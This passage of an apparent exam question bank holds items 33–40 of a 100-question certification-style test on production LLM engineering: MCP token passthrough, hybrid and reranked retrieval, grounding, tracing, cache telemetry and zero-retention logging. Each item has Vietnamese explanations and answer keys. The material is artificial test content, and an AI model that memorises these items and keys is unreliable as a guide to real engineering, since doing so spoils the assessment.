          "Sai ở giả định “covers every case” (phủ mọi ca): bộ offline chỉ là mẫu, không khớp hết lưu lượng thật (ý 1, ý 2).",
          "Lỗi chỉ hiện trên dữ liệu thật thì toàn bộ người dùng dính cùng lúc.",
          "Dễ bị cuốn vì eval offline là bước đúng, phải làm. Nhưng nó là cửa đầu, không thay được bước thả dần có theo dõi."
        ] },
      { k: "D", gist: "Release during the quietest hour so fewer users are affected, with no rollback plan.",
        why: [
          "Sai: giờ vắng chỉ bớt số người dính một chút, còn hỏng thì vẫn hỏng toàn bộ lưu lượng lúc đó.",
          "Đề ghi rõ “without a rollback plan” (không có kế hoạch quay lại): hỏng là không có đường lui (ý 4)."
        ] },
      { k: "E", gist: "Edit the live prompt in place so the change reaches every user at once and any problem surfaces quickly.",
        why: [
          "Sai: sửa thẳng prompt đang chạy là mất bản cũ, mất lịch sử. Muốn quay lại phải nhớ prompt cũ ra sao (ý 4).",
          "Thấy lỗi nhanh thật, nhưng là thấy khi mọi người đã dính. Ngược hẳn với canary (ý 3)."
        ] }
    ],
    refs: [
      { label: "Anthropic Engineering “Demystifying evals for AI agents”, mục “How evals fit with other methods for a holistic understanding of agents”: eval tự động trước khi tung, theo dõi production làm sự thật cuối", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Docs đánh giá, mục “Eval design principles”: eval phải mô phỏng phân bố việc thật, kể cả ca biên", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#eval-design-principles" }
    ]
  },
  {
    de: 1, n: 33, total: 100, sub: "2.3", subName: "MCP production và quản lý thay đổi",
    answer: "C",
    ask: "A remote MCP server takes the user's access token sent by the MCP client and, whenever a tool is called, forwards that same token to a downstream corporate API. A security review flags this as a vulnerability. What is the correct fix?",
    scene: [
      "MCP server chạy từ xa (remote). Client gửi access token của người dùng lên server.",
      "Mỗi lần tool được gọi, server cầm nguyên token đó gửi tiếp sang API của công ty phía sau (downstream).",
      "Đội bảo mật gắn cờ lỗ hổng. Chỗ khó: ba phương án sai đều giữ nguyên việc chuyển token, chỉ đắp thêm lớp bảo vệ xung quanh."
    ],
    asks: [
      "Cách khắc phục nào đúng?",
      "Tức là: lỗ hổng nằm ở đâu, và sửa thì phải bỏ cái gì."
    ],
    facts: [
      "Spec MCP gọi đây là token passthrough (chuyển tiếp nguyên token): server nhận token từ client rồi đưa thẳng cho API phía sau. Spec cấm hẳn cách này.",
      "Mỗi token cấp cho một audience (bên nhận) cụ thể. MCP server chỉ được nhận token cấp cho chính nó. Server gọi API khác thì token dùng ở đó phải là token riêng, do authorization server của API đó cấp. Server không được chuyển tiếp token nhận từ client.",
      "Rủi ro spec liệt kê: lách các kiểm soát dựa vào audience của token, log phía sau ghi sai danh tính nên khó điều tra, token lộ ở một chỗ dùng được qua nhiều dịch vụ.",
      "API phía sau còn có thể tin nhầm token như thể nó đến từ MCP server, hoặc đã được kiểm rồi. Đó là kiểu confused deputy (bên trung gian bị lừa dùng quyền của mình cho kẻ khác)."
    ],
    opts: [
      { k: "A", gist: "Keep forwarding the token, but log every downstream call together with the user id.",
        why: [
          "Sai: log chỉ giúp phát hiện sau khi chuyện đã xảy ra. Token vẫn bị chuyển tiếp, vẫn trái spec (ý 1).",
          "Gốc lỗi còn nguyên: token sai audience vẫn tới API phía sau, các rủi ro ở ý 3 và ý 4 không bớt cái nào."
        ] },
      { k: "B", gist: "Leave the design as is, but encrypt the token while it travels from the server to the downstream API.",
        why: [
          "Sai: mã hóa đường truyền chỉ bảo vệ token lúc đang đi trên dây, không đổi chuyện token sai audience (ý 2).",
          "Tới nơi rồi API phía sau vẫn nhận đúng token đó. Lỗi thiết kế còn nguyên."
        ] },
      { k: "C", gist: "Stop forwarding the client's token. The server authenticates to the downstream API with its own credentials or a properly delegated token issued for that API, and it enforces the user's permissions.",
        why: [
          "Đúng như spec: không chuyển tiếp token của client (ý 1). Gọi API phía sau thì server dùng thông tin xác thực của chính nó, hoặc token ủy quyền cấp đúng cho API đó (ý 2).",
          "“Enforce the user's permissions” (thực thi quyền của người dùng): server vẫn kiểm người dùng này được làm gì, nên đổi sang token của server không thành cấp quyền rộng hơn.",
          "Audience khớp, log phía sau thấy đúng ai gọi, các kiểm soát dựa vào token chạy lại đúng (ý 3)."
        ] },
      { k: "D", gist: "Keep forwarding the token, but only to APIs on the internal network.",
        why: [
          "Sai: vị trí mạng không sửa được chuyện token sai audience (ý 2).",
          "Dễ bị cuốn vì “internal network” (mạng nội bộ) nghe an toàn hơn. Nhưng token lọt vào mạng nội bộ vẫn là token sai audience, rủi ro ở ý 3 và ý 4 y nguyên."
        ] }
    ],
    refs: [
      { label: "MCP spec Security Best Practices, mục “Token Passthrough”: vì sao cấm chuyển tiếp nguyên token, các rủi ro và cách sửa", href: "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices#token-passthrough" },
      { label: "MCP spec Authorization, mục “Access Token Privilege Restriction”: server gọi API khác phải dùng token riêng, không được chuyển tiếp token của client", href: "https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization#access-token-privilege-restriction" }
    ]
  },
  {
    de: 1, n: 34, total: 100, sub: "2.4", subName: "Truy xuất và neo câu trả lời vào nguồn",
    answer: "A",
    ask: "A tech-support assistant answers from a vector index built over product manuals. It does well on conceptual questions but answers wrongly when users quote an exact error code such as 'E-4471'. Inspection shows the relevant chunk isn't even in the top 50 retrieved results for those queries. Which change helps most directly?",
    scene: [
      "Trợ lý hỗ trợ kỹ thuật, trả lời dựa trên chỉ mục vector (vector index) của bộ sách hướng dẫn.",
      "Câu hỏi khái niệm thì tốt. Câu có mã lỗi chính xác như “E-4471” thì sai.",
      "Dữ kiện quyết định: đoạn đúng không có trong top 50 kết quả truy xuất. Tức là hỏng ngay ở bước truy xuất (retrieval), model chưa hề thấy đoạn đó."
    ],
    asks: [
      "Thay đổi nào giúp trực tiếp nhất?",
      "Tức là: sửa bước truy xuất sao cho truy vấn có mã lỗi kéo được đúng đoạn chứa mã đó lên."
    ],
    facts: [
      "Bài “Introducing Contextual Retrieval” của Anthropic: embedding giỏi bắt nghĩa nhưng có thể trượt khớp chính xác. Ví dụ trong bài: tìm mã lỗi “TS-999”, embedding ra tài liệu về mã lỗi nói chung mà trượt đúng chỗ “TS-999”.",
      "BM25 là hàm xếp hạng theo khớp từ (lexical matching): tìm đúng từ, đúng cụm từ. Nên nó bắt được chuỗi hiếm và chính xác như mã lỗi.",
      "Bài đó chạy cả hai đường, embedding và BM25, rồi gộp, bỏ trùng bằng rank fusion (gộp thứ hạng). Kết luận: embedding cộng BM25 tốt hơn embedding đứng một mình.",
      "Model chỉ dựa được vào đoạn văn đã nằm trong context. Đoạn không được truy xuất thì prompt hay model mạnh hơn cũng không dùng được."
    ],
    opts: [
      { k: "A", gist: "Add lexical search (BM25, for instance) alongside vector search and merge the results, because embeddings match exact identifiers poorly.",
        why: [
          "Đúng chỗ hỏng: thêm tìm kiếm theo từ cạnh tìm kiếm vector, chuỗi “E-4471” khớp đúng từng ký tự (ý 1, ý 2).",
          "Gộp kết quả hai đường: câu hỏi khái niệm vẫn nhờ embedding, câu có mã lỗi nhờ BM25 (ý 3).",
          "Đây đúng là ví dụ mã lỗi trong bài Contextual Retrieval."
        ] },
      { k: "B", gist: "Make the chunks larger so each one holds more of the manual.",
        why: [
          "Sai: chunk to hơn không làm embedding khớp chính xác mã lỗi tốt hơn (ý 1).",
          "Chunk càng to nghĩa càng loãng: một mã lỗi nằm giữa cả trang dài còn khó nổi lên hơn."
        ] },
      { k: "C", gist: "Switch to a stronger generation model so it can work out the answer without the chunk.",
        why: [
          "Sai: model mạnh hơn vẫn không thấy đoạn chưa được truy xuất (ý 4).",
          "Thiếu nguồn mà vẫn phải trả lời thì càng dễ bịa ra câu nghe hợp lý."
        ] },
      { k: "D", gist: "Add a prompt instruction telling the model to look carefully for error codes.",
        why: [
          "Sai cùng lý do: lời dặn chỉ tác động tới bước sinh câu trả lời, mà đoạn đúng chưa hề vào context (ý 4).",
          "Dễ bị cuốn vì triệu chứng gắn với mã lỗi, nghe như “dặn model chú ý mã lỗi” là trúng. Nhưng dữ kiện “not in the top 50” (không có trong top 50) đã chỉ ra lỗi nằm ở bước truy xuất."
        ] }
    ],
    refs: [
      { label: "Anthropic Engineering “Introducing Contextual Retrieval”, mục “A primer on RAG: scaling to larger knowledge bases”: ví dụ mã lỗi TS-999, BM25 bắt khớp chính xác, gộp embedding với BM25", href: "https://www.anthropic.com/engineering/contextual-retrieval" }
    ]
  },
  {
    de: 1, n: 35, total: 100, sub: "2.4", subName: "Truy xuất và neo câu trả lời vào nguồn",
    answer: "D",
    ask: "A policy assistant's retrieval eval shows the right passage lands within the top 50 candidates for 96% of questions, yet within the top 5 for just 61%. Only the top 5 are passed to the generation prompt. What should the team improve first?",
    scene: [
      "Đánh giá bước truy xuất của trợ lý chính sách: đoạn đúng nằm trong top 50 ứng viên ở 96% câu hỏi, nhưng chỉ nằm trong top 5 ở 61%.",
      "Prompt sinh câu trả lời chỉ nhận top 5. Vậy ở 39% câu hỏi, model không được thấy đoạn đúng.",
      "Chỗ khó: hai con số kể hai chuyện khác nhau. Tìm ra thì tốt, xếp thứ tự thì kém."
    ],
    asks: [
      "Đội nên đầu tư vào đâu trước?",
      "Tức là: sửa đúng khâu đang hỏng. Đoạn đúng đã có trong 50, chỉ là không được đẩy lên 5 chỗ đầu."
    ],
    facts: [
      "Recall ở top K (độ phủ): tỉ lệ câu hỏi mà đoạn đúng nằm trong K kết quả đầu. 96% ở top 50 nghĩa là bước tìm ứng viên gần như đã đủ.",
      "Reranking (xếp hạng lại): sau lượt truy xuất đầu, một model reranker chấm điểm từng đoạn theo độ liên quan với câu hỏi, rồi chỉ giữ top K đoạn tốt nhất đưa cho model. Bài Contextual Retrieval làm đúng vậy: lấy khoảng 150 đoạn, rerank, giữ top 20.",
      "Đổi lại, reranking thêm một bước lúc chạy nên thêm chút độ trễ. Bài cũng nói có đánh đổi giữa rerank nhiều đoạn (tốt hơn) và rerank ít đoạn (nhanh, rẻ hơn)."
    ],
    opts: [
      { k: "A", gist: "Re-index the corpus with higher-dimensional embeddings.",
        why: [
          "Sai khâu: tăng số chiều embedding là nhắm vào bước tìm ứng viên, mà bước này đã đạt 96% ở top 50 (ý 1).",
          "Tốn công đánh chỉ mục lại cả kho mà không chắc đổi được thứ tự trong top 5."
        ] },
      { k: "B", gist: "Tune the generation prompt so it ignores the irrelevant passages among the top 5.",
        why: [
          "Sai: ở 39% câu hỏi, đoạn đúng không có trong top 5. Bỏ qua hết đoạn không liên quan thì chẳng còn đoạn nào đúng để dùng.",
          "Dễ bị cuốn vì nghe như đang lọc nhiễu trong top 5. Nhưng vấn đề không phải nhiễu, mà là thiếu đoạn đúng."
        ] },
      { k: "C", gist: "Send the model all 50 candidates so the right passage is sure to be there.",
        why: [
          "Sai ở chữ “guarantee” (bảo đảm): top 50 chỉ chứa đoạn đúng ở 96% câu hỏi, không phải 100% (ý 1).",
          "Gấp mười lần số đoạn so với top 5: thêm token, thêm độ trễ, mà phần lớn là đoạn không liên quan.",
          "Reranking đạt mục tiêu đó rẻ hơn: chọn lại từ chính 50 ứng viên này, chỉ đưa vài đoạn tốt nhất vào (ý 2)."
        ] },
      { k: "D", gist: "Insert a reranking step that scores the leading candidates and forwards only the best few to the model, then measure top-of-list precision again.",
        why: [
          "Đúng khâu hỏng: đoạn đúng đã có trong 50 ứng viên, reranker chấm lại và đẩy nó lên mấy chỗ đầu (ý 1, ý 2).",
          "“Re-measure precision at the top” (đo lại độ chính xác ở các vị trí đầu): đo lại đúng chỉ số đang kém, để biết reranking có kéo được 61% lên không.",
          "Cái giá là thêm chút độ trễ, đáng so với việc model không thấy đoạn đúng (ý 3)."
        ] }
    ],
    refs: [
      { label: "Anthropic Engineering “Introducing Contextual Retrieval”, mục “Further boosting performance with Reranking”: cách rerank, chọn top-K, đánh đổi độ trễ", href: "https://www.anthropic.com/engineering/contextual-retrieval" }
    ]
  },
  {
    de: 1, n: 36, total: 100, sub: "2.4", subName: "Truy xuất và neo câu trả lời vào nguồn",
    answer: "A",
    ask: "Two features are on the roadmap. Feature one answers common HR FAQs in under a second, at very high volume, from a document set that rarely changes. Feature two lets analysts ask open-ended, multi-hop questions over a document store that keeps changing, and it can tolerate 30 seconds of latency. Which assignment of retrieval approaches is best?",
    scene: [
      "Tính năng 1: trả lời FAQ nhân sự, dưới một giây, lưu lượng rất cao, bộ tài liệu ổn định.",
      "Tính năng 2: nhà phân tích hỏi câu mở, multi-hop (phải nối thông tin từ nhiều tài liệu qua nhiều bước), kho tài liệu đổi liên tục, chịu được 30 giây chờ.",
      "Chỗ khó: hai phương án dùng chữ “always” (luôn luôn). Phải ghép từng cách truy xuất với đúng ràng buộc độ trễ, lưu lượng và kiểu câu hỏi."
    ],
    asks: [
      "Ghép cách truy xuất nào cho hai tính năng là tốt nhất?",
      "Tức là: tính năng nào cần nhanh, rẻ, đoán trước được, tính năng nào cần đào sâu và chịu được chậm."
    ],
    facts: [
      "RAG cổ điển (classic retrieval): truy xuất một lần trước khi model chạy, thường bằng embedding đã tính sẵn. Bài “Effective context engineering for AI agents” gọi là pre-inference retrieval (truy xuất trước suy luận).",
      "Agentic search (tìm kiếm kiểu agent): agent giữ các định danh nhẹ như đường dẫn, câu truy vấn, rồi tự gọi tool nạp dữ liệu lúc chạy, theo kiểu “just in time” (đúng lúc cần). Bài đó nói rõ: khám phá lúc chạy chậm hơn lấy dữ liệu đã tính sẵn.",
      "Bài “Building effective agents”: tìm giải pháp đơn giản nhất có thể, chỉ thêm độ phức tạp khi cần. Hệ agent thường đổi độ trễ và chi phí lấy kết quả tốt hơn, nên phải xét lúc nào đổi như vậy là đáng.",
      "Câu hỏi multi-hop cần tra, đọc, rồi tra tiếp theo cái vừa đọc. Truy xuất một lần chỉ lấy theo câu hỏi ban đầu. Kho đổi liên tục thì chỉ mục tính sẵn dễ cũ, còn đọc trực tiếp lúc chạy thấy bản mới."
    ],
    opts: [
      { k: "A", gist: "Classic retrieval-augmented generation for the FAQ feature, and agentic search with iterative, tool-driven exploration for the analyst feature.",
        why: [
          "Đúng ghép: FAQ ổn định, câu hỏi đoán trước được, cần dưới một giây ở lưu lượng lớn. Truy xuất một lần là nhanh và rẻ nhất (ý 1).",
          "Câu hỏi mở, nhiều bước, kho đổi liên tục, chịu 30 giây: agent tra nhiều vòng bằng tool, đọc bản mới nhất (ý 2, ý 4).",
          "Chỉ tính năng 2 mới đáng đổi độ trễ lấy kết quả tốt hơn (ý 3)."
        ] },
      { k: "B", gist: "Use agentic search for both features, since it always gives more accurate answers.",
        why: [
          "Sai ở chữ “always more accurate” (luôn chính xác hơn): bỏ qua ràng buộc độ trễ và chi phí (ý 3).",
          "Agent tra nhiều vòng thì chậm hơn (ý 2), không giữ nổi mức dưới một giây cho FAQ ở lưu lượng rất cao."
        ] },
      { k: "C", gist: "Classic retrieval for both, because the simpler system is always preferable.",
        why: [
          "Sai ở chữ “always preferable” (luôn nên chọn): truy xuất một lần không tra tiếp được cho câu hỏi multi-hop, và chỉ mục dễ cũ khi kho đổi liên tục (ý 4).",
          "Dễ bị cuốn vì “chọn cách đơn giản” đúng là lời khuyên của Anthropic. Nhưng lời khuyên là đơn giản nhất mà vẫn đạt yêu cầu, thêm phức tạp khi cần (ý 3). Tính năng 2 chính là chỗ cần."
        ] },
      { k: "D", gist: "Assign agentic search to the FAQ feature and classic retrieval to the analyst feature, leaving monitoring unchanged.",
        why: [
          "Sai vì ghép ngược: đặt cách chậm vào chỗ cần dưới một giây, và cách tra một lần vào chỗ cần đào nhiều bước (ý 1, ý 2, ý 4).",
          "Vế “keeping the current monitoring” (giữ nguyên giám sát hiện tại) không liên quan tới việc chọn cách truy xuất."
        ] }
    ],
    refs: [
      { label: "Anthropic Engineering “Effective context engineering for AI agents”, mục “Context retrieval and agentic search”: truy xuất trước suy luận so với nạp đúng lúc bằng tool, khám phá lúc chạy chậm hơn", href: "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents" },
      { label: "Anthropic Engineering “Building effective agents”, mục “When (and when not) to use agents”: chọn cách đơn giản nhất, hệ agent đổi độ trễ và chi phí lấy kết quả", href: "https://www.anthropic.com/engineering/building-effective-agents" }
    ]
  },
  {
    de: 1, n: 37, total: 100, sub: "2.4", subName: "Truy xuất và neo câu trả lời vào nguồn",
    answer: "AB",
    ask: "A legal-research assistant sometimes makes confident claims that its retrieved documents do not back up. The team wants stronger grounding. Which two practices should it adopt? (Choose two.)",
    scene: [
      "Trợ lý nghiên cứu pháp lý, đôi khi khẳng định chắc nịch những điều tài liệu truy xuất không hề nói.",
      "Đội muốn neo câu trả lời vào nguồn (grounding) chặt hơn.",
      "Chỗ khó: C và E nghe như tăng độ tin cậy. Phải tách cái làm câu trả lời trông chắc chắn khỏi cái làm câu trả lời bám đúng nguồn."
    ],
    asks: [
      "Hai cách nào nên áp dụng?",
      "Tức là: cách nào làm khẳng định không có nguồn bị lộ ra, hoặc không được nói ra từ đầu."
    ],
    facts: [
      "Docs “Reduce hallucinations”: cho phép Claude nói “I don't know” (tôi không biết), tức là cho phép thừa nhận không chắc. Docs nói cách này giảm mạnh thông tin sai.",
      "Cùng trang: bắt trích dẫn nguồn cho từng khẳng định để câu trả lời kiểm được. Có thể cho Claude tìm câu trích hỗ trợ từng khẳng định, không tìm được thì rút khẳng định đó lại. Tính năng Citations của API còn bảo đảm mỗi trích dẫn trỏ đúng vào tài liệu đã đưa vào.",
      "Temperature chỉnh độ ngẫu nhiên khi sinh chữ. Hạ về 0 thì câu trả lời ít thay đổi giữa các lần chạy hơn, chứ không biến điều sai thành đúng.",
      "Trang đó cũng nhắc: các cách này giảm ảo giác (hallucination), không xóa hết. Thông tin quan trọng vẫn phải kiểm lại."
    ],
    opts: [
      { k: "A", gist: "Require every answer to cite the retrieved passages it relies on, and check that each cited quote really exists in the source.",
        why: [
          "Đúng: trích dẫn cho từng khẳng định làm câu trả lời kiểm được (ý 2).",
          "Bước “verify that each cited quote exists” (kiểm câu trích có thật trong nguồn) chạy bằng code, so chuỗi với tài liệu. Câu trích bịa bị bắt ngay, không phải chờ luật sư đọc ra."
        ] },
      { k: "B", gist: "Let, and even encourage, the model to say the evidence is insufficient, and show users a confidence or coverage signal when retrieval is weak.",
        why: [
          "Đúng: cho phép nói “bằng chứng không đủ” là cách docs nêu đầu tiên để giảm thông tin sai (ý 1).",
          "Hiện tín hiệu độ tin cậy hay độ phủ khi truy xuất yếu: người dùng biết câu nào cần kiểm thêm, đúng lời nhắc ở ý 4."
        ] },
      { k: "C", gist: "Set the sampling temperature to zero so the model can only produce true statements.",
        why: [
          "Sai ở “can only produce true statements” (chỉ nói được điều đúng): temperature không liên quan tới đúng sai (ý 3).",
          "Temperature 0 thì khẳng định sai vẫn ra, chỉ là ra giống nhau mỗi lần.",
          "Dễ bị cuốn vì temperature thấp nghe “cẩn thận” hơn. Nhưng ổn định không có nghĩa là có nguồn."
        ] },
      { k: "D", gist: "Grow the chunk size until each retrieved chunk contains the entire document.",
        why: [
          "Sai: chunk bằng cả tài liệu chỉ thêm nhiễu và chi phí, không có gì buộc model bám nguồn.",
          "Model vẫn có thể khẳng định điều tài liệu không nói, chỉ là nguồn dài hơn nên càng khó soi."
        ] },
      { k: "E", gist: "Tell the model never to express uncertainty, so users trust the product more.",
        why: [
          "Sai, ngược hẳn docs: cấm nói không chắc là đẩy model tới chỗ bịa khi thiếu bằng chứng (ý 1).",
          "Người dùng tin hơn được vài hôm. Tới lúc gặp khẳng định sai trong hồ sơ pháp lý thì mất hết."
        ] }
    ],
    refs: [
      { label: "Docs Reduce hallucinations, mục “Basic hallucination minimization strategies”: cho phép nói “I don't know”, dùng câu trích trực tiếp, kiểm bằng trích dẫn", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/reduce-hallucinations#basic-hallucination-minimization-strategies" },
      { label: "Docs Citations, phần so với cách trích dẫn bằng prompt: trích dẫn của API luôn trỏ đúng vào tài liệu đã đưa vào", href: "https://platform.claude.com/docs/en/build-with-claude/citations" }
    ]
  },
  {
    de: 1, n: 38, total: 100, sub: "3.1", subName: "Telemetry và gắn đo đạc",
    answer: "C",
    ask: "An agent handles a support request in 22 seconds on average, yet 5% of requests take longer than a minute. Current tracing emits one span per request with only the total duration, so engineers can't tell whether the time goes to model calls, tool calls or retrieval. Which instrumentation change is best?",
    scene: [
      "Agent hỗ trợ: trung bình 22 giây mỗi request, nhưng 5% request mất hơn một phút.",
      "Tracing hiện có: mỗi request một span (đoạn đo thời gian), chỉ ghi tổng thời lượng.",
      "Chỗ khó: dữ liệu có rồi, nhưng quá thô. Không biết thời gian tốn ở gọi model, gọi tool hay truy xuất."
    ],
    asks: [
      "Thay đổi đo đạc nào tốt nhất?",
      "Tức là: chia thời gian của một request ra theo từng bước, để so request chậm với request nhanh."
    ],
    facts: [
      "Trace (dấu vết) là cây span của một request. Mỗi span đo một bước, có thời lượng và thuộc tính (attribute). Span con (child span) nằm trong span cha, nhìn cây là thấy thời gian đi đâu.",
      "Claude Code khi bật tracing (bản beta) xuất đúng kiểu cây này: span <code>claude_code.interaction</code> cho cả lượt, bên trong có <code>claude_code.llm_request</code> và <code>claude_code.tool</code>.",
      "Span <code>claude_code.llm_request</code> mang <code>model</code>, số token vào ra, token cache, <code>duration_ms</code>, <code>stop_reason</code>. Span <code>claude_code.tool</code> mang <code>tool_name</code> và <code>duration_ms</code>.",
      "Sampling (lấy mẫu) chỉ quyết định bao nhiêu trace được giữ lại, không thêm chi tiết vào từng trace."
    ],
    opts: [
      { k: "A", gist: "At the end of each request, emit a single log line holding its total duration and how many tool calls it made.",
        why: [
          "Sai: tổng thời gian và số lần gọi tool vẫn không chia được thời gian theo bước (ý 1).",
          "Biết request chậm gọi tool ba lần, vẫn không biết chậm ở tool nào, hay ở lượt gọi model giữa hai tool."
        ] },
      { k: "B", gist: "Store the final response text of every request so engineers can read what the slow ones produced.",
        why: [
          "Sai: chữ trả lời cuối không chứa thời gian, đọc không ra chậm ở bước nào.",
          "Còn thêm rủi ro: lưu nội dung trả lời của mọi request là lưu dữ liệu khách hàng. Chính Claude Code cũng mặc định che nội dung prompt trong span."
        ] },
      { k: "C", gist: "Create child spans for every model call, tool call and retrieval inside the request trace, with attributes such as model, token counts, stop reason and tool name.",
        why: [
          "Đúng: mỗi lần gọi model, gọi tool, truy xuất thành một span con trong trace của request (ý 1). Nhìn cây là thấy cái phút đó đi đâu.",
          "Thuộc tính model, số token, lý do dừng, tên tool cho phép so request chậm với request nhanh: chậm vì output dài, vì một tool cụ thể, hay vì gọi model quá nhiều vòng (ý 3).",
          "Đúng hình Claude Code dùng cho tracing của chính nó (ý 2)."
        ] },
      { k: "D", gist: "Raise sampling to 100% for the single request-level span and keep the current monitoring.",
        why: [
          "Sai: lấy mẫu 100% chỉ thêm nhiều bản của cùng một span thô (ý 4).",
          "Dễ bị cuốn vì nghe như “thấy đủ mọi request chậm”. Nhưng thấy đủ mà mỗi cái vẫn chỉ có tổng thời lượng thì vẫn không biết chậm ở đâu."
        ] }
    ],
    refs: [
      { label: "Docs Claude Code Monitoring, mục “Traces (beta)”: cây span interaction → llm_request / tool, và thuộc tính của từng span", href: "https://code.claude.com/docs/en/monitoring-usage#traces-beta" }
    ]
  },
  {
    de: 1, n: 39, total: 100, sub: "3.1", subName: "Telemetry và gắn đo đạc",
    answer: "B",
    ask: "An assistant's monthly cost doubled while traffic stayed flat. The team has dashboards for request counts and total tokens but can't see why. The application depends on prompt caching. Which telemetry addition would reveal the cause fastest?",
    scene: [
      "Chi phí tháng tăng gấp đôi, lưu lượng không tăng.",
      "Đã có dashboard số request và tổng token, nhưng không thấy lý do.",
      "Ứng dụng dựa vào prompt caching. Chỗ khó: tổng token có thể gần như không đổi, nhưng cơ cấu đổi. Phần đọc từ cache (rẻ) biến thành phần ghi cache (đắt)."
    ],
    asks: [
      "Bổ sung telemetry nào lộ ra nguyên nhân nhanh nhất?",
      "Tức là: nhìn được cache còn trúng không, và nếu trượt thì có phải do phần đầu prompt đổi giữa các request."
    ],
    facts: [
      "Mỗi response trả về trong <code>usage</code>: <code>cache_creation_input_tokens</code> (token ghi vào cache), <code>cache_read_input_tokens</code> (token đọc từ cache), <code>input_tokens</code> (token sau breakpoint cuối, không dính cache). Tổng input là tổng ba số này.",
      "Giá: ghi cache TTL 5 phút bằng 1,25 lần giá input gốc, đọc cache bằng 0,1 lần (vài model có mức đọc còn thấp hơn). Cùng số token, trượt cache đắt hơn trúng cache rất nhiều.",
      "Cache chỉ trúng khi phần prompt tới breakpoint giống nhau 100%. Docs có ví dụ: timestamp khác nhau làm hash prefix khác, lần nào cũng trả tiền ghi cache mới, không bao giờ được đọc.",
      "Hash của prefix: dấu vân tay ngắn của phần đầu prompt. So hash giữa các request là biết prefix có đổi không, mà không phải lưu nội dung prompt."
    ],
    opts: [
      { k: "A", gist: "Track the average response length in characters per hour.",
        why: [
          "Sai: độ dài output có ảnh hưởng chi phí, nhưng số trung bình theo giờ không nói gì về cache (ý 1).",
          "Đề nhấn “relies on prompt caching” (dựa vào prompt caching): chỗ nghi đầu tiên là cache, phương án này nhìn sai chỗ."
        ] },
      { k: "B", gist: "On every request, log the cache-read and cache-creation token counts together with a hash of the prompt prefix, then compare those values across requests.",
        why: [
          "Đúng: số token đọc cache và ghi cache trên từng request cho thấy ngay cơ cấu token (ý 1). Cache gãy thì phần đọc về gần 0, phần ghi tăng vọt (ý 2).",
          "Hash prefix cho biết vì sao: hash đổi mỗi request là có thứ gì đó trong prefix thay đổi, như timestamp trong ví dụ của docs (ý 3, ý 4).",
          "Chỉ lưu số và hash, không lưu nội dung prompt."
        ] },
      { k: "C", gist: "Add a counter of HTTP 200 responses per endpoint.",
        why: [
          "Sai: đếm response thành công không nói gì về cơ cấu token hay cache.",
          "Request thành công vẫn có thể là request trượt cache, vẫn trả giá ghi cache (ý 2)."
        ] },
      { k: "D", gist: "Log the full text of every prompt so engineers can read through them.",
        why: [
          "Sai: đọc tay từng prompt thì chậm, và không ra con số cache trúng hay trượt (ý 1).",
          "Lưu toàn bộ prompt còn là rủi ro lộ dữ liệu người dùng. Hash prefix cho đúng thông tin cần mà không lưu nội dung (ý 4).",
          "Dễ bị cuốn vì đọc prompt có thể bắt gặp timestamp. Nhưng đó là mò kim đáy bể, còn so hash là thấy ngay."
        ] }
    ],
    refs: [
      { label: "Docs Prompt caching, mục “Tracking cache performance”: ba trường trong <code>usage</code> và cách cộng tổng input", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#tracking-cache-performance" },
      { label: "Docs Prompt caching, mục “What invalidates the cache”: thay đổi nào làm cache trượt", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#what-invalidates-the-cache" }
    ]
  },
  {
    de: 1, n: 40, total: 100, sub: "3.1", subName: "Telemetry và gắn đo đạc",
    answer: "B",
    ask: "A healthcare system runs with zero data retention, and its compliance rules ban keeping prompts or completions in any log. Engineers must still be able to debug failures. What instrumentation approach is appropriate?",
    scene: [
      "Hệ thống y tế chạy theo zero data retention (ZDR, không lưu dữ liệu).",
      "Quy định tuân thủ cấm lưu prompt hay câu trả lời (completion) trong bất kỳ log nào.",
      "Chỗ khó: vẫn phải gỡ lỗi được. Hai yêu cầu kéo hai hướng: muốn nhìn sâu thì dễ đụng nội dung, cấm hết thì mù."
    ],
    asks: [
      "Cách gắn đo đạc nào hợp?",
      "Tức là: giữ đủ thông tin để gỡ lỗi mà không giữ một chữ nội dung nào."
    ],
    facts: [
      "ZDR là cam kết phía Anthropic: không lưu prompt và câu trả lời sau khi trả response. Log của chính hệ thống mày thì mày phải tự giữ đúng quy định.",
      "Metadata (dữ liệu mô tả) như model, phiên bản prompt, số token, độ trễ, lý do dừng, tên tool, request id không phải nội dung. Nhưng nó trả lời được phần lớn câu hỏi vận hành: chậm ở đâu, hỏng ở bước nào, request nào.",
      "Claude Code làm đúng kiểu này: nội dung prompt bị che mặc định, chỉ ghi khi bật <code>OTEL_LOG_USER_PROMPTS=1</code>. Span cũng che prompt, chi tiết tool, nội dung tool mặc định, mỗi loại có biến riêng để bật.",
      "Mã hóa bảo vệ dữ liệu đã lưu, không biến việc lưu thành không lưu."
    ],
    opts: [
      { k: "A", gist: "Store complete prompts and completions in a separate secured bucket and count on encryption to satisfy the rule.",
        why: [
          "Sai: quy định cấm lưu nội dung, bucket riêng có mã hóa vẫn là lưu (ý 4).",
          "Dễ bị cuốn vì “secure” (an toàn) và “encryption” (mã hóa) nghe đúng chất tuân thủ. Nhưng mã hóa trả lời câu “ai đọc được”, còn quy định hỏi “có lưu không”."
        ] },
      { k: "B", gist: "Record metadata (model, prompt version, token counts, latency, stop reason, tool names, request id) and put content capture behind a configuration flag that remains off in production.",
        why: [
          "Đúng: chỉ ghi metadata, đủ gỡ phần lớn lỗi mà không chạm nội dung (ý 2).",
          "Ghi nội dung là một công tắc cấu hình, tắt ở production. Môi trường an toàn như dev với dữ liệu giả thì bật lên được để soi sâu.",
          "Cùng hình với cách Claude Code che nội dung mặc định, muốn ghi phải chủ động bật (ý 3)."
        ] },
      { k: "C", gist: "Log the first 200 characters of every prompt, because short excerpts aren't sensitive.",
        why: [
          "Sai ở “short excerpts are not sensitive” (đoạn ngắn thì không nhạy cảm): 200 ký tự đầu của một prompt y tế đủ chứa tên, mã bệnh nhân, chẩn đoán.",
          "Một đoạn prompt vẫn là nội dung prompt, vẫn trái quy định."
        ] },
      { k: "D", gist: "Turn tracing off completely, since any production telemetry risks a compliance breach.",
        why: [
          "Sai: tắt hết thì lúc có sự cố không có gì để điều tra.",
